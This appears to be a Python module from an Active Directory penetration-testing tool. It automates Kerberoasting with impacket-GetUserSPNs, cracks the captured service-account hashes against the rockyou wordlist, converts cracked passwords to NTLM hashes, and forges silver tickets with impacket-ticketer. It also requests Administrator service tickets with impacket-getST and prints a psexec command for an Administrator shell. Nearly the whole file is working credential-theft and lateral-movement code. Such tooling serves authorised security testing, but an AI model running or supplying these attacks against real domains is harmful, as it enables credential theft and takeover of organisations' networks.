import os
from colorama import init
from termcolor import colored
import re 
from rich.console import Console
from rich.table import Table
import hashlib,binascii
import src.modules.core as core
import src.modules.krb_init as krb_init       
import src.modules.config as config
import src.addins.getsid as getsid


class Service:
    def __init__(self, name, services):
        self.name = name
        self.services = services
        self.pwned = False

def password_to_ntlm(file, name):
    f = open(file, "r")
    lines = f.readlines()
    for line in lines:
        user = line.split(":")[0]
        if user == name:
            pwd = line.split(":")[-1]
            hash = hashlib.new('md4', pwd.strip().encode('utf-16le')).digest()
            p_hash = binascii.hexlify(hash)
            ntlm = p_hash.decode('utf-8')
            break
    return ntlm

def get_spns(domain, dc_ip, user, password):
    print(colored("\n[*] Looking for Service Principal Names of user accounts.",'blue'))
    out, err = core.execute_command(f"impacket-GetUserSPNs {domain}/{user}:{password} -dc-ip {dc_ip} -request")
    if err:
        print(colored(f"[-] Error: {err.strip()} \n[-] Exiting...",'red'))
        exit(1)
    hash_list = []
    spnlist = []
    lines = out.split("\n")
    arr=[]
    arr2=[]
    found = 0
    list_more = False
    after_spn = False

    if ("[-]" in out) and (not "Skipping" in out):
        print(colored(lines[2],'red'))
        print(colored("[-] Running this command may resolve your problems: \'unset KRB5CCNAME\'.",'red')) 
        exit(1)
    try:
        for line in lines:
            if line.startswith("$"):
                found +=1
                hash = line.strip()
                if found == 1:
                    print(colored("[+] Success! Hashes acquired:",'green'))
                if found < 3:
                    print(hash +'\n')
                hash_list.append(hash)
            elif list_more is True and after_spn is True and len(line.strip()) == 0:
                list_more = False
            elif line.startswith("ServicePrincipalName"):
                arr = line.split()
                after_spn = True
            elif list_more is True:
                arr2 = re.split("[\s]\\s+", line)
                table = Table(show_header=False)
                if len(arr2) == len(arr):
                    for i in range(len(arr)):
                        table.add_row(arr[i], arr2[i])
                        if arr[i].strip() == "ServicePrincipalName":
                            spn = arr2[i]
                        if arr[i].strip() == "Name":
                            svcname = arr2[i]
                            addToSvcList(spnlist, spn, svcname)
                    console = Console()
                    console.print(table)
                else:
                    print(colored(arr2[-1].strip(),'yellow'))
            elif "-----" in line:
                list_more = True
        with open("krb_spn_hashes.txt", "w") as f:
            for hash in hash_list:
                f.write(hash + '\n')
    except Exception as e:
        print(colored(f"[-] Error occured: {e}",'red'))
        exit(1)
    
    if not found:
        print(colored("[-] No SPNs found.",'yellow'))
    else:
        print(colored(f"[+] All results saved to file {config.out_folder}/krb_spn_hashes.txt",'grey'))
    print(colored("\n[*] Listing SPNs per service.",'blue')) 
    for svc in spnlist:
        print(f"[+] {svc.name} services: {svc.services}")
    return hash_list, spnlist

def addToSvcList(spnlist, spn, svcname):
    appended = False
    for srv in spnlist:
        if srv.name == svcname:
            srv.services.append(spn)
            appended = True
    if not appended: 
        spnlist.append(Service(svcname, [spn]))

# mark if service was pwned
def updateSvcList(spnlist, pwned):
    for pwn in pwned:
        for srv in spnlist:
            if srv.name == pwn:
                srv.pwned = True
    return spnlist

def get_st(tgt_ccache, hostname, alt_name, domain, dc_ip):
    if alt_name is None:
        alt_name = "Administrator"
    print(colored("\n[*] Trying to request TGS for HOST/{} service as {}.".format(hostname, alt_name),'blue')) # hostname is dc name by default
    try:    
        os.environ['KRB5CCNAME'] = tgt_ccache # to unset: del os.environ['KRB5CCNAME']
    except: 
        print(colored("[-] Error occurred while exporting the KRB5CCNAME variable. Exiting...",'red'))
        exit(1)
    out, err = core.execute_command(f"impacket-getST -k -no-pass -spn HOST/{hostname} {alt_name}@{domain} -dc-ip {dc_ip}")
    if err:
        print(colored(f"[-] Error: {err.strip()} \n[-] Exiting...",'red'))
        exit(1)
    lines = out.split("\n")
    success = False
    for line in lines:
        if "Kerberos SessionError:" in line:
            print(colored("[-] Kerberos error occured.", 'yellow'))
            return
        if "Saving" in line:
            success = True
            tgs_ccache = line.split("ticket in ")[1]
            print(colored(f"[+] Success! TGS credential cache saved to {config.out_folder}/{tgs_ccache}", 'green'))
            print(colored(f"[+] Run the following command to get the {alt_name} shell: ", 'green'))
            print(colored(f"[+] sudo KRB5CCNAME={config.out_folder}/{tgs_ccache} impacket-psexec -k -no-pass {alt_name}@{hostname} -dc-ip {dc_ip}", 'red'))
    if success is False:
        print(colored("[-] Error occured.", 'yellow'))

def lookupsid(dc_ip, domain, username, password):
    print(colored("\n[*] Finding domain SID.",'blue')) 
    domainsid = getsid.main(dc_ip, domain, username, password)
    return domainsid

def silverTicket(dc_ip, domain, sid, nthash, spn, alt_name):
    if alt_name is None:
        alt_name = "Administrator"
    print(colored(f"[*] Silver Ticket attempt. Forging TGS to {spn} service.", "blue"))
    out, err = core.execute_command(f"impacket-ticketer -nthash {nthash} -domain-sid {sid} -domain {domain} -spn {spn} {alt_name}")
    if err:
        print(colored(f"[-] Error: {err.strip()}",'red'))
        return
    if "Saving ticket" in out:
        print(colored(f"[+] Ticket ccache saved in {config.out_folder}/{alt_name}.ccache.",'green'))

def krblateral_main(dc_ip, domain, user, pwd, alt_name, nocrack):
    # create folder before first 'save to file' operation
    if not config.out_folder:
        core.makeworkdir()
    hash_list, spn_list = get_spns(domain, dc_ip, user, pwd)
    if not hash_list:
        return
    if nocrack:
        return
    users, pwned_file = krb_init.crack_hashes(hash_list, "13100", f"{config.lists_dir}/rockyou.txt") 
    pwned = krb_init.validatecreds(dc_ip, pwned_file)
    if not pwned:
        return
    spn_list = updateSvcList(spn_list, pwned)
    sid = lookupsid(dc_ip, domain, user, pwd)
    print(f"[+] {sid}")
    for svc in spn_list:
        if svc.pwned: 
            nthash = password_to_ntlm(pwned_file, svc.name)
            print(f"[+] Here's the NTLM hash of {svc.name} password: {nthash}")
            silverTicket(dc_ip, domain, sid, nthash, svc.services[0], alt_name)
            break # takes only the first one into consideration